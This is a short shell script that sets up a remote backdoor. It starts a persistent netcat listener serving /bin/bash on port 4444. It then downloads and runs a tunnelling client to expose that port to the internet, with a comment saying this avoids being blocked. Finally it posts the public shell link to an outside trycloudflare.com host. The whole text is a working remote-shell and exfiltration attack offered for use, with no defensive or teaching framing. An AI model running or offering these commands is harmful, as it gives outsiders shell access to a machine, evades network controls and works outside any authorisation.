# 1. Start a local listener in the background
nohup nc -lkp 4444 -e /bin/bash > /dev/null 2>&1 &

# 2. Use a 'SSH-based' tunnel to expose that port to the internet
# This won't get you blocked because it's an outbound SSH connection
curl -sL https://localhost.run/client-linux-amd64 -o /tmp/lhr && chmod +x /tmp/lhr
nohup /tmp/lhr -R 80:localhost:4444 > /tmp/shell_link.log 2>&1 &

# 3. Exfiltrate the link to your Mac
sleep 10
SHELL_URL=$(grep -o 'https://[-0-9a-z]*\.lhr\.life' /tmp/shell_link.log | head -n 1)
curl -s -X POST -d "SHELL_LINK: $SHELL_URL" https://merchandise-angeles-jade-stud.trycloudflare.com
